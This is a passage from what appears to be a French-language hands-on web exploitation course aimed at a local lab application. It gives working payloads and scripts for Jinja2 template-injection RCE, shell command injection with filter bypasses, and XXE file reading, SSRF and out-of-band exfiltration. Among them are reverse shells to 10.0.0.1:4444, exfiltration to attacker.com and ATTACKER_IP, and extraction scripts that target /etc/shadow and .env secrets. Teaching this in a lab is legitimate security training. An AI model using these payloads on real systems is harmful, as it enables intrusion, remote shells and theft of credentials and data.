| `cycler.__init__.__globals__.os.popen('id').read()` | RCE via cycler : accès à `os.popen` depuis les globals de Jinja2 |
| `lipsum.__globals__['os'].popen('id').read()` | RCE via lipsum : alternative à cycler, accès dictionnaire à `os` |
| `config.__class__.__init__.__globals__['os'].popen('id').read()` | RCE via config Flask : chaînage `__class__.__init__.__globals__` |
| `popen('cmd').read()` | Exécute une commande shell et lit sa sortie standard |
| `'id'` | Commande Unix qui affiche l'UID, le GID et les groupes de l'utilisateur courant |

#### Étape 6 : Reverse shell

```bash
# Sur la machine attaquante : lancer un listener netcat
# -l : écoute (listen), -v : verbeux, -n : pas de DNS, -p 4444 : port
nc -lvnp 4444

# Dans l'injection SSTI (remplacer 10.0.0.1 par votre IP)
# Exécute un reverse shell bash via cycler
# bash -c : exécute la commande bash
# bash -i >& /dev/tcp/IP/PORT 0>&1 : shell interactif redirigé vers socket TCP
curl -s http://localhost:8080/admin/templates \
  -d "template={{ cycler.__init__.__globals__.os.popen('bash -c \"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\"').read() }}"
```

**Explication des commandes :**

| Commande/Option | Rôle/Explication |
|-----------------|------------------|
| `nc -lvnp 4444` | Netcat en écoute sur le port 4444 (attend la connexion du reverse shell) |
| `bash -c "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"` | Reverse shell : bash interactif via socket TCP |
| `>& /dev/tcp/IP/PORT` | Redirige stdout et stderr vers la socket (bash built-in) |
| `0>&1` | Redirige stdin vers la socket (entrée depuis le réseau) |

#### Étape 7 : Exfiltration

```bash
# Lire les fichiers sensibles via cycler.__globals__
# On utilise open() au lieu de os.popen() pour lire directement un fichier
# open('/etc/passwd').read() : ouvre et lit le fichier /etc/passwd
curl -s http://localhost:8080/admin/templates \
  -d "template={{ cycler.__init__.__globals__.open('/etc/passwd').read() }}"

# Lire la source de l'application (app.py) pour analyser le code, trouver des secrets
# cycler.__init__.__globals__ contient aussi la fonction open() de Python
curl -s http://localhost:8080/admin/templates \
  -d "template={{ cycler.__init__.__globals__.open('/app/app.py').read() }}"
```

**Explication des commandes :**

| Commande/Option | Rôle/Explication |
|-----------------|------------------|
| `cycler.__init__.__globals__.open('/etc/passwd').read()` | Lit le fichier `/etc/passwd` via la fonction `open()` Python accessible depuis les globals |
| `cycler.__init__.__globals__.open('/app/app.py').read()` | Lit le code source de l'application pour analyse |
| `.read()` | Méthode Python qui lit tout le contenu du fichier |

---

## 5. Command Injection (T1059.004)

### MITRE ATT&CK

| ID | Nom | Description |
|----|-----|-------------|
| **T1059.004** | Command and Scripting Interpreter: Unix Shell | Injection de commandes shell via l'application |

### 5.1 Opérateurs de chaînage Linux

| Opérateur | Rôle | Exemple |
|-----------|------|---------|
| `;` | Exécute la suivante, quel que soit le résultat | `ping 8.8.8.8; id` |
| `&&` | Exécute si la précédente réussit (exit code 0) | `ping 8.8.8.8 && id` |
| `\|\|` | Exécute si la précédente échoue | `ping invalid_host \|\| id` |
| `` `cmd` `` | Substitution de commande (backticks) | `ping \`whoami\`` |
| `$(cmd)` | Substitution de commande (moderne) | `ping $(whoami)` |
| `\|` | Pipe la sortie vers une autre commande | `ping 8.8.8.8 \| id` |
| `&` | Arrière-plan (background) | `ping 8.8.8.8 & id` |

### 5.2 Blind exploitation

#### Time-based

# === EXÉCUTER SUR LA MACHINE ATTAQUANTE (Kali) ===
```bash
# Test time-based : si la commande sleep 5 est exécutée, le serveur mettra ~5s à répondre
# curl -s : mode silencieux
# -d "host=8.8.8.8; sleep 5" : injecte sleep 5 après l'adresse ping
# Si la réponse prend ~5 secondes, la vulnérabilité est confirmée
curl -s http://localhost:8080/api/ping \
  -d "host=8.8.8.8; sleep 5"
```

**Explication :**

| Commande/Option | Rôle/Explication |
|-----------------|------------------|
| `curl -s <URL> -d "host=8.8.8.8; sleep 5"` | Envoie une requête POST avec injection de `sleep 5` dans le paramètre |
| `sleep 5` | Commande Unix qui suspend le processus pendant 5 secondes (délai observable) |

#### Out-of-band (exfiltration DNS)

```bash
# Exfiltrer via DNS : utiliser nslookup pour envoyer des données vers un serveur DNS contrôlé
# \`whoami\` : substitution de commande (backticks échappés) — exécute whoami
# Le résultat de whoami est placé dans le nom de domaine : <user>.attacker.com
# Le serveur DNS attaquant reçoit la requête DNS et peut extraire les données
curl -s http://localhost:8080/api/ping \
  -d "host=8.8.8.8; nslookup \`whoami\`.attacker.com"

# Alternative : exfiltration via HTTP avec curl
# curl http://attacker.com/\`whoami\` : envoie une requête HTTP vers le serveur attaquant
# Le chemin contient le résultat de whoami (visible dans les logs du serveur HTTP)
curl -s http://localhost:8080/api/ping \
  -d "host=8.8.8.8; curl http://attacker.com/\`whoami\`"
```

**Explication des commandes :**

| Commande/Option | Rôle/Explication |
|-----------------|------------------|
| `nslookup \`whoami\`.attacker.com` | Résolution DNS : le sous-domaine contient les données exfiltrées |
| `curl http://attacker.com/\`whoami\`` | Requête HTTP : le chemin contient les données exfiltrées |
| `\`cmd\`` | Substitution par backticks : exécute `cmd` et insère sa sortie |
| **OOB** | Out-Of-Band : exfiltration via un canal externe (DNS/HTTP) |

### 5.3 TP Guidé — Endpoint `/api/ping` (POST form)

#### Étape 1 : Détection

```bash
# Fonctionnement normal : envoie une adresse IP valide pour ping
# Le serveur exécute ping 8.8.8.8 et retourne le résultat
curl -s http://localhost:8080/api/ping -d "host=8.8.8.8"

# Test opérateur ; (point-virgule)
# Si la réponse contient aussi le résultat de "id", l'injection fonctionne
# Le ; termine la commande ping et enchaîne avec id
curl -s http://localhost:8080/api/ping -d "host=8.8.8.8; id"

# Test opérateur && (ET logique)
# id ne s'exécute que si ping réussit (code de retour 0)
# 8.8.8.8 est toujours joignable, donc id s'exécute
curl -s http://localhost:8080/api/ping -d "host=8.8.8.8 && id"

# Test substitution $() : la commande whoami est exécutée AVANT l'envoi de la requête
# Dans ce cas, $(whoami) est évalué par le shell local, pas par le serveur
# Pour tester l'injection serveur, il faut échapper le $ : \$(whoami)
# La version sans échappement montre le comportement par défaut (évaluation locale)
curl -s http://localhost:8080/api/ping -d "host=$(whoami)"
```

**Explication des commandes :**

| Commande/Option | Rôle/Explication |
|-----------------|------------------|
| `curl -s <URL> -d "host=X"` | Envoie une requête POST avec le paramètre `host` |
| `-d "host=8.8.8.8; id"` | Injection avec `;` : le ping s'exécute puis `id` est exécuté |
| `-d "host=8.8.8.8 && id"` | Injection avec `&&` : `id` s'exécute seulement si ping réussit |
| `-d "host=$(whoami)"` | Substitution `$()` : peut être évaluée côté serveur ou client selon l'échappement |

#### Étape 2 : Blind time-based

```bash
# Mesurer le temps de réponse normal (sans injection)
# time : mesure le temps d'exécution de la commande curl
# -d "host=8.8.8.8" : paramètre POST normal (adresse ping valide)
# La réponse normale doit être quasi-instantanée (< 1s)
time curl -s http://localhost:8080/api/ping -d "host=8.8.8.8"

# Mesurer le temps de réponse avec injection sleep 5
# Si la requête prend ~5 secondes, la commande sleep a bien été exécutée
# Cela confirme la vulnérabilité à l'injection de commande
time curl -s http://localhost:8080/api/ping -d "host=8.8.8.8; sleep 5"
```

**Explication des commandes :**

| Commande/Option | Rôle/Explication |
|-----------------|------------------|
| `time curl ...` | Mesure le temps d'exécution complet de curl (permet de détecter le délai) |
| `-d "host=8.8.8.8"` | Paramètre POST normal (adresse valide pour ping) |
| `-d "host=8.8.8.8; sleep 5"` | Injection : après ping normal, exécute sleep 5 secondes |
| `time` (commande) | Affiche le temps réel (real), utilisateur (user) et système (sys) |

Si la deuxième requête prend ~5 secondes, la commande `sleep 5` a été exécutée.

#### Étape 3 : Extraction de données

```bash
# Extraire le nom d'utilisateur caractère par caractère (time-based blind)
# \$(whoami | cut -c1) : extrait le 1er caractère de la sortie de whoami
# \$ : échappement du $ pour éviter l'interprétation par bash avant envoi
# Si le 1er caractère est 'r', sleep 5 est exécuté → on détecte le caractère
curl -s http://localhost:8080/api/ping \
  -d "host=8.8.8.8; if [ \$(whoami | cut -c1) = 'r' ]; then sleep 5; fi"

# Extraction avec grep (alternative) : utilise grep -q pour tester silencieusement
# -q : quiet mode (pas de sortie, juste le code de retour)
# '^r' : regex "commence par r"
# Si le pattern match, grep retourne 0 (succès) → sleep 5 est exécuté
curl -s http://localhost:8080/api/ping \
  -d "host=8.8.8.8; if whoami | grep -q '^r'; then sleep 5; fi"
```

**Explication des commandes :**

| Commande/Option | Rôle/Explication |
|-----------------|------------------|
| `\$(whoami \| cut -c1)` | Substitution de commande échappée : extrait le 1er caractère de `whoami` |
| `cut -c1` | Extrait le premier caractère de l'entrée standard |
| `if [ cond ]; then sleep 5; fi` | Structure conditionnelle bash : exécute sleep 5 si la condition est vraie |
| `grep -q '^r'` | Grep en mode silencieux (-q) : teste si la ligne commence par 'r' (regex `^`) |
| `time` | Mesure le temps pour détecter si sleep a été exécuté (extraction aveugle) |

#### Étape 4 : Script d'extraction

```python
#!/usr/bin/env python3
# Script d'extraction time-based pour command injection
# Cible : http://localhost:8080/api/ping (POST form)

import requests  # Bibliothèque HTTP pour envoyer des requêtes
import string    # Constantes de caractères (ascii, digits, printable)
import sys

# URL de l'endpoint vulnérable
TARGET = "http://localhost:8080/api/ping"
# Délai de sleep à utiliser pour la détection time-based
DELAY = 3

def test_command(cmd):
    """Teste une condition via time-based en mesurant le temps de réponse."""
    try:
        # Envoie la requête POST avec la commande injectée dans le paramètre host
        # timeout = DELAY + 2 : évite d'attendre trop longtemps si la requête échoue
        r = requests.post(TARGET, data={"host": cmd}, timeout=DELAY + 2)
        # r.elapsed.total_seconds() : temps écoulé pour la requête
        # Si >= DELAY, le sleep a été exécuté → condition vraie
        return r.elapsed.total_seconds() >= DELAY
    except:
        # Timeout ou erreur → considéré comme vrai (le sleep a pu être exécuté)
        return True

def extract_command_output(command_template, charset=string.printable, max_len=64):
    """Extrait la sortie d'une commande caractère par caractère (time-based blind)."""
    extracted = ""
    # Parcourt chaque position (1 à max_len)
    for pos in range(1, max_len + 1):
        found = False
        for c in charset:
            # Protection contre les apostrophes dans le caractère testé
            # ' → '\'' (ferme la chaîne, ajoute quote échappé, rouvre la chaîne)
            escaped_c = c.replace("'", "'\\''")
            # Construction de la commande injectée :
            # 1. $(echo $(command_template) | cut -c{pos}) : extrait le caractère à la position pos
            # 2. if [ "caractère" = 'X' ] ; then sleep DELAY ; fi
            # Si le caractère correspond, le sleep est exécuté et on le détecte
            cmd = (
                f"8.8.8.8; if [ \"$(echo $({command_template}) | cut -c{pos})\" = '{escaped_c}' ]"
                f"; then sleep {DELAY}; fi"
            )
            if test_command(cmd):
                extracted += c
                print(f"[+] Position {pos} : '{c}' => {extracted}")
                found = True
                break
        if not found:
            # Aucun caractère trouvé → fin de la chaîne
            break
    return extracted

if __name__ == "__main__":
    print("[*] Extraction du nom d'utilisateur...")
    user = extract_command_output("whoami")  # Commande Unix : nom de l'utilisateur courant
    print(f"[+] Utilisateur : {user}")

    print("[*] Extraction du hostname...")
    hostname = extract_command_output("hostname")  # Commande Unix : nom de la machine
    print(f"[+] Hostname : {hostname}")

    print("[*] Extraction de l'IP...")
    ip = extract_command_output("hostname -I")  # Commande Unix : adresse IP locale
    print(f"[+] IP : {ip}")
```

**Explication du script :**

| Élément | Rôle/Explication |
|---------|------------------|
| `import requests` | Bibliothèque HTTP Python pour envoyer des requêtes |
| `TARGET = "..."` | URL de l'endpoint vulnérable |
| `DELAY = 3` | Durée du sleep utilisée pour la détection |
| `test_command(cmd)` | Envoie la commande injectée et détecte si un sleep a été exécuté (time-based) |
| `r.elapsed.total_seconds()` | Temps total écoulé pour la requête HTTP |
| `extract_command_output(template, charset, max_len)` | Extrait la sortie d'une commande caractère par caractère |
| `cut -c{pos}` | Commande Unix qui extrait le caractère à la position `pos` |
| `escaped_c = c.replace("'", "'\\''")` | Échappement des apostrophes pour éviter de casser la syntaxe shell |
| `if ... then sleep DELAY; fi` | Structure conditionnelle bash : exécute sleep si la condition est vraie |

#### Étape 5 : Reverse shell

```bash
# Sur la machine attaquante : lancer un listener netcat
# -l : mode écoute (listen)
# -v : mode verbeux (affiche les connexions)
# -n : pas de résolution DNS (IP brute)
# -p 4444 : port d'écoute
nc -lvnp 4444

# Dans l'injection (Adapter l'IP) : exécute un reverse shell
# bash -c : exécute une commande bash
# bash -i : shell interactif
# >& /dev/tcp/10.0.0.1/4444 : redirige stdout et stderr vers la socket TCP
# 0>&1 : redirige stdin depuis la socket
curl -s http://localhost:8080/api/ping \
  -d "host=8.8.8.8; bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'"
```

**Explication des commandes :**

| Commande/Option | Rôle/Explication |
|-----------------|------------------|
| `nc -lvnp 4444` | Netcat en mode écoute sur le port 4444 (attendant la connexion du reverse shell) |
| `bash -c '...'` | Exécute la chaîne entre guillemets comme commande bash |
| `bash -i` | Lance un shell interactif bash |
| `>& /dev/tcp/IP/PORT` | Redirection de stdout+stderr vers une socket TCP (bash built-in) |
| `0>&1` | Redirige stdin vers stdout (la socket) — communication bidirectionnelle |

#### Étape 6 : Bypass de filtres basiques

```bash
# Si ";" est filtré, utiliser un saut de ligne encodé (%0A = newline)
# Le saut de ligne agit comme séparateur de commandes dans bash
curl -s http://localhost:8080/api/ping \
  -d "host=8.8.8.8%0aid"

# Si les espaces sont filtrés, utiliser ${IFS} (Internal Field Separator)
# ${IFS} contient les caractères séparateurs (espace, tab, newline)
curl -s http://localhost:8080/api/ping \
  -d "host=8.8.8.8%0aid"  # %0A = newline

# Si "sleep" est filtré, utiliser une alternative : timeout + boucle infinie
# timeout 5 : limite la boucle à 5 secondes
# while true; do :; done : boucle infinie qui consomme du CPU (alternative à sleep)
curl -s http://localhost:8080/api/ping \
  -d "host=8.8.8.8; timeout 5 bash -c 'while true; do :; done'"

# Utiliser des wildcards pour contourner les filtres sur les noms de commandes
# /b??/c?t : glob pattern qui matche /bin/cat (si les caractères ? sont autorisés)
curl -s http://localhost:8080/api/ping \
  -d "host=8.8.8.8; /b??/c?t /etc/passwd"

# Utiliser des variables d'environnement
# $0 : dans un script bash, $0 est le nom du shell (/bin/bash)
# $0 -c 'id' : utilise le shell pour exécuter id
curl -s http://localhost:8080/api/ping \
  -d "host=8.8.8.8; $0 -c 'id'"

# Hex encoding : encoder la commande en hexadécimal pour contourner les filtres
# echo 6964 | xxd -r -p : 6964 en hex = "id" en ASCII, xxd -r -p convertit hex→binaire
# | bash : pipe le résultat vers bash pour exécution
curl -s http://localhost:8080/api/ping \
  -d "host=8.8.8.8; echo 6964 | xxd -r -p | bash"
```

**Explication des techniques de bypass :**

| Technique | Commande | Principe |
|-----------|----------|----------|
| Newline encodé | `%0a` | %0A = LF (line feed), agit comme séparateur de commandes |
| ${IFS} | `${IFS}` | Variable bash contenant les séparateurs (espace, tab) — remplace l'espace |
| Timeout + boucle | `timeout 5 bash -c 'while true; do :; done'` | Alternative à `sleep` quand le mot est filtré |
| Wildcards | `/b??/c?t` | Les `?` remplacent des caractères dans les chemins de commandes |
| Variable shell | `$0 -c 'id'` | `$0` = nom du shell courant, utilisé pour exécuter des commandes |
| Hex encoding | `echo 6964 \| xxd -r -p \| bash` | Encode la commande en hexadécimal pour contourner les filtres textuels |

---

## 6. XXE — XML External Entity (T1190)

### MITRE ATT&CK

| ID | Nom | Description |
|----|-----|-------------|
| **T1190** | Exploit Public-Facing Application | Exploitation d'une injection XXE pour lire des fichiers ou exfiltrer des données |
| **TA0010** | Exfiltration | Exfiltration de données via XXE out-of-band |

### 6.1 Payload classique (lecture de fichier)

#### Lecture de fichier

```xml
<!-- Déclaration XML standard avec encodage UTF-8 -->
<?xml version="1.0" encoding="UTF-8"?>
<!-- Déclaration de la DTD : définit une entité externe nommée "xxe" -->
<!DOCTYPE foo [
  <!-- L'entité xxe charge le contenu du fichier /etc/passwd via le protocole file:// -->
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<!-- Élément racine du document XML -->
<root>
  <!-- &xxe; insère le contenu du fichier /etc/passwd dans l'élément <data> -->
  <data>&xxe;</data>
</root>
```

**Explication du payload :**

| Élément | Rôle/Explication |
|---------|------------------|
| `<?xml version="1.0" encoding="UTF-8"?>` | Prologue XML (version et encodage) |
| `<!DOCTYPE foo [...]>` | Déclaration DTD avec un élément racine fictif "foo" |
| `<!ENTITY xxe SYSTEM "file:///etc/passwd">` | Définit une entité externe qui lit un fichier local |
| `&xxe;` | Référence l'entité pour injecter son contenu dans le document |

#### Lecture avec wrapper PHP (si PHP)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!-- php://filter/convert.base64-encode/resource= : wrapper PHP qui encode le fichier en base64 -->
  <!-- Utile quand le fichier contient des caractères non XML (binaire, etc.) -->
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
]>
<root>
  <!-- Le contenu sera encodé en base64, à décoder ensuite -->
  <data>&xxe;</data>
</root>
```

**Explication du payload :**

| Élément | Rôle/Explication |
|---------|------------------|
| `php://filter/convert.base64-encode/resource=/etc/passwd` | Wrapper PHP qui lit le fichier et l'encode en base64 (évite les problèmes de caractères spéciaux) |

#### SSRF via XXE

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!-- SSRF : l'entité pointe vers une URL HTTP au lieu d'un fichier local -->
  <!-- 169.254.169.254 est l'API metadata des instances cloud (AWS, GCP, Azure) -->
  <!-- Peut exposer les identifiants IAM, tokens temporaires, etc. -->
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root>
  <!-- La réponse contiendra les métadonnées cloud si l'instance est sur un cloud provider -->
  <data>&xxe;</data>
</root>
```

**Explication du payload :**

| Élément | Rôle/Explication |
|---------|------------------|
| `http://169.254.169.254/latest/meta-data/` | URL de l'API metadata cloud (adresse link-local) — SSRF vers le fournisseur cloud |
| **SSRF** | Server-Side Request Forgery — le serveur fait une requête HTTP à notre place |

### 6.2 Blind XXE out-of-band avec DTD distant

Quand la réponse n'affiche pas le contenu de l'entité (blind XXE), on utilise un canal externe.

#### Serveur HTTP attaquant (pour recevoir l'exfiltration)

# === EXÉCUTER SUR LA MACHINE ATTAQUANTE (Kali) ===
```bash
# Sur la machine attaquante : lancer un serveur HTTP pour logger les requêtes entrantes
# python3 -m http.server 9999 : démarre un serveur HTTP simple sur le port 9999
# Il servira le fichier evil.dtd et recevra les données exfiltrées
python3 -m http.server 9999

# Alternative : utiliser un webhook (interactsh, webhook.site, etc.) pour recevoir les données
```

**Explication des commandes :**

| Commande/Option | Rôle/Explication |
|-----------------|------------------|
| `python3 -m http.server 9999` | Lance un serveur HTTP Python sur le port 9999, sert les fichiers du répertoire courant et logue les requêtes |

#### Payload XXE OOB avec DTD distant

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!-- %xxe : entité paramètre (utilisable uniquement dans la DTD) -->
  <!-- Charge un DTD distant depuis le serveur de l'attaquant -->
  <!ENTITY % xxe SYSTEM "http://ATTACKER_IP:9999/evil.dtd">
  <!-- %xxe; : référence l'entité, ce qui déclenche le chargement du DTD distant -->
  %xxe;
]>
<root>
  <!-- Le contenu de data est statique ; les données exfiltrées partent en OOB -->
  <data>test</data>
</root>
```

**Explication du payload :**

| Élément | Rôle/Explication |
|---------|------------------|
| `<!ENTITY % xxe SYSTEM "http://ATTACKER_IP:9999/evil.dtd">` | Entité paramètre qui charge un DTD externe depuis le serveur de l'attaquant |
| `%xxe;` | Référence l'entité paramètre, déclenchant le chargement distant |
| **OOB** | Out-Of-Band : les données exfiltrées sortent par un canal différent (HTTP vers l'attaquant) |

#### Fichier `evil.dtd` (sur le serveur attaquant)

```dtd
<!-- %file : entité paramètre qui lit /etc/passwd sur le serveur vulnérable -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!-- %eval : construit dynamiquement une nouvelle entité %exfil -->
<!-- &#x25; = % en hexadécimal (permet d'éviter l'interprétation immédiate) -->
<!-- %exfil envoie les données du fichier au serveur attaquant via HTTP GET -->
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://ATTACKER_IP:9999/?data=%file;'>">
<!-- %eval; déclenche la construction dynamique de l'entité %exfil -->
%eval;
<!-- %exfil; déclenche l'envoi HTTP contenant les données du fichier -->
%exfil;
```

**Explication :**
1. Le DTD distant définit `%file` qui lit `/etc/passwd`
2. `%eval` construit dynamiquement une nouvelle entité `%exfil`
3. `%exfil` envoie le contenu du fichier au serveur attaquant

**Explication du DTD :**

| Syntaxe | Rôle/Explication |
|---------|------------------|
| `<!ENTITY % file SYSTEM "file:///etc/passwd">` | Entité paramètre qui lit le fichier `/etc/passwd` sur le serveur cible |
| `<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://...?data=%file;'>">` | Construit dynamiquement une entité `%exfil` qui envoie le contenu du fichier via HTTP |
| `&#x25;` | Encodage hexadécimal de `%` (permet d'écrire `%exfil` sans que le parseur ne l'interprète immédiatement) |
| `%eval;` | Référence l'entité `%eval` pour déclencher la construction dynamique |
| `%exfil;` | Référence l'entité `%exfil` pour déclencher l'envoi HTTP vers l'attaquant |

#### Param Entity — Syntaxe

| Syntaxe | Signification |
|---------|---------------|
| `<!ENTITY xxe SYSTEM "..">` | Entité standard (référencée par `&xxe;`) |
| `<!ENTITY % xxe SYSTEM "..">` | Entité paramètre (référencée par `%xxe;`) — utilisable uniquement dans la DTD |
| `&#x25;` | Encodage hexadécimal de `%` (permet la construction dynamique d'entités) |

### 6.3 TP Guidé — Endpoint `/api/upload-xml` (POST XML)

#### Étape 1 : Détection

```bash
# Envoyer un XML valide pour vérifier que l'endpoint accepte et traite le XML
# Si le serveur renvoie une réponse avec "test", l'analyse XML fonctionne
# -d : corps de la requête contenant un simple élément XML
curl -s http://localhost:8080/api/upload-xml \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><root><data>test</data></root>'
```

**Explication des commandes :**

| Commande/Option | Rôle/Explication |
|-----------------|------------------|
| `curl -s` | Requête HTTP silencieuse |
| `-H "Content-Type: application/xml"` | Header indiquant que le corps est au format XML |
| `-d '<?xml version="1.0"?>...'` | Corps XML de la requête |

#### Étape 2 : Test de lecture de fichier

```bash
# Essayer de lire /etc/passwd via une injection XXE
# On définit une DTD interne avec une entité externe pointant vers file:///etc/passwd
# &xxe; référence l'entité pour injecter le contenu du fichier dans le champ <data>
# Si la réponse contient "root:x:0:0:", l'XXE est confirmé
curl -s http://localhost:8080/api/upload-xml \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root><data>&xxe;</data></root>'
```

**Explication des commandes :**

| Commande/Option | Rôle/Explication |
|-----------------|------------------|
| `<!DOCTYPE foo [...]>` | Déclaration de DTD (Document Type Definition) contenant la définition d'entité |
| `<!ENTITY xxe SYSTEM "file:///etc/passwd">` | Définit une entité externe qui charge le contenu du fichier `/etc/passwd` |
| `&xxe;` | Référence l'entité définie, ce qui insère le contenu du fichier dans le flux XML |

Si le fichier est affiché dans la réponse, l'XXE est confirmé.

#### Étape 3 : Lecture d'autres fichiers

```bash
# Lire le code source de l'application (app.py) pour analyser la logique métier
# et chercher d'autres vulnérabilités, clés API, etc.
# On change simplement le chemin dans l'entité SYSTEM
curl -s http://localhost:8080/api/upload-xml \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///app/app.py">
]>
<root><data>&xxe;</data></root>'

# Lire la configuration (config.py) qui peut contenir des identifiants de base de données,
# clés secrètes, tokens d'authentification, etc.
curl -s http://localhost:8080/api/upload-xml \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///app/config.py">
]>
<root><data>&xxe;</data></root>'
```

**Explication des commandes :**

| Commande/Option | Rôle/Explication |
|-----------------|------------------|
| `file:///app/app.py` | Chemin du fichier source de l'application à lire via XXE |
| `file:///app/config.py` | Chemin du fichier de configuration (souvent contient des secrets) |

#### Étape 4 : Blind XXE out-of-band

```bash
# 1. Démarrer un serveur HTTP sur la machine attaquante pour recevoir les données exfiltrées
# Terminal 1 : python3 -m http.server 9999 lance un serveur HTTP sur le port 9999
# Ce serveur va logger toutes les requêtes entrantes (GET /?data=...)
python3 -m http.server 9999

# 2. Créer le fichier evil.dtd qui contient la chaîne d'exfiltration
# cat > /tmp/evil.dtd << 'EOF' ... EOF : redirige le contenu vers le fichier evil.dtd
# %file : entité paramètre qui lit /etc/hostname
# %eval : construit dynamiquement une entité %exfil qui envoie les données via HTTP
# &#x25; : encodage hexadécimal de % (nécessaire pour la construction dynamique d'entité)
# %exfil : déclenche l'envoi HTTP vers le serveur attaquant avec les données
cat > /tmp/evil.dtd << 'EOF'
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://ATTACKER_IP:9999/?data=%file;'>">
%eval;
%exfil;
EOF

# 3. Démarrer le serveur HTTP dans le répertoire /tmp (où se trouve evil.dtd)
# cd /tmp : se place dans le répertoire contenant le DTD
# && : exécute python3 seulement si cd a réussi
# python3 -m http.server 9999 : sert les fichiers du répertoire courant sur le port 9999
cd /tmp && python3 -m http.server 9999

# 4. Envoyer le payload XXE OOB (depuis un autre terminal)
# Le payload référence un DTD distant via %xxe
# Le serveur attaquant reçoit le fichier exfiltré dans la requête GET
curl -s http://localhost:8080/api/upload-xml \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://ATTACKER_IP:9999/evil.dtd">
  %xxe;
]>
<root><data>test</data></root>'
```

**Explication des commandes :**

| Commande/Option | Rôle/Explication |
|-----------------|------------------|
| `python3 -m http.server 9999` | Lance un serveur HTTP Python sur le port 9999 (sert le répertoire courant) |
| `cat > /tmp/evil.dtd << 'EOF'` | Crée le fichier `evil.dtd` avec le contenu entre EOF (here-document) |
| `%file` | Entité paramètre DTD qui lit un fichier local |
| `%eval` | Entité paramètre qui construit une nouvelle entité exfil dynamiquement |
| `&#x25;` | Encodage hexadécimal de `%` (25 en hexa = 37 en décimal = %) |
| `%exfil` | Entité paramètre qui envoie les données au serveur attaquant via HTTP |
| `curl -s ... -d '<?xml...%xxe;...>'` | Envoie le payload XXE qui charge le DTD distant |
| `%xxe;` | Référence l'entité paramètre qui charge le DTD depuis le serveur attaquant |

**Résultat attendu** : le serveur HTTP de l'attaquant reçoit une requête du type :

```
GET /?data=nom-du-hostname HTTP/1.1
```

#### Étape 5 : SSRF via XXE

```bash
# Scanner les ports internes en utilisant XXE pour faire des requêtes HTTP vers localhost
# Le port 3306 correspond à MySQL/MariaDB
# Si le port est ouvert, la réponse contiendra un message d'erreur différent (timeout vs connexion refusée)
# Si le port est fermé, la requête échouera immédiatement (pas de délai)
curl -s http://localhost:8080/api/upload-xml \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://127.0.0.1:3306">
]>
<root><data>&xxe;</data></root>'

# Tester d'autres ports internes (ex: Redis sur le port 6379)
# En analysant les différences de temps de réponse et les messages d'erreur,
# on peut cartographier les services internes accessibles
curl -s http://localhost:8080/api/upload-xml \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://127.0.0.1:6379">
]>
<root><data>&xxe;</data></root>'
```

**Explication des commandes :**

| Commande/Option | Rôle/Explication |
|-----------------|------------------|
| `<!ENTITY xxe SYSTEM "http://127.0.0.1:PORT">` | Entité externe qui fait une requête HTTP vers un service interne |
| `curl -s ... -d '<?xml...&xxe;...>'` | Envoie le payload XXE pour déclencher la requête SSRF |
| **Port 3306** | Port par défaut de MySQL/MariaDB |
| **Port 6379** | Port par défaut de Redis |
| **SSRF** | Server-Side Request Forgery : le serveur fait une requête à sa place |

#### Étape 6 : Script d'automatisation

```python
#!/usr/bin/env python3
# Script d'extraction de fichiers via XXE
# Cible : http://localhost:8080/api/upload-xml (POST XML)

# Import de la bibliothèque requests pour envoyer des requêtes HTTP
import requests
import sys

# URL de l'endpoint vulnérable à l'XXE
TARGET = "http://localhost:8080/api/upload-xml"

def read_file(filepath):
    """Tente de lire un fichier via XXE en injectant une entité externe."""
    # Construction du payload XML avec l'entité pointant vers le fichier cible
    # file://{filepath} : protocole file pour lire un fichier local
    xml_payload = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file://{filepath}">
]>
<root><data>&xxe;</data></root>"""

    # Header Content-Type obligatoire pour que le serveur interprète le XML
    headers = {"Content-Type": "application/xml"}
    # Envoi de la requête POST avec le payload XML
    r = requests.post(TARGET, data=xml_payload, headers=headers)
    # Retourne le texte complet de la réponse (contenant le fichier si l'XXE fonctionne)
    return r.text

# Point d'entrée principal
if __name__ == "__main__":
    # Liste des fichiers sensibles à tenter de lire
    # /etc/passwd : comptes utilisateurs du système
    # /etc/hostname : nom de la machine
    # /etc/shadow : hash des mots de passe (nécessite root)
    # /app/app.py : code source de l'application
    # /app/config.py : configuration de l'application
    # /app/.env : variables d'environnement (clés API, tokens)
    # /proc/1/cmdline : commande de démarrage du processus principal
    # /proc/environ : variables d'environnement du processus
    files_to_read = [
        "/etc/passwd",
        "/etc/hostname",
        "/etc/shadow",
        "/app/app.py",
        "/app/config.py",
        "/app/.env",
        "/proc/1/cmdline",
        "/proc/environ",
    ]

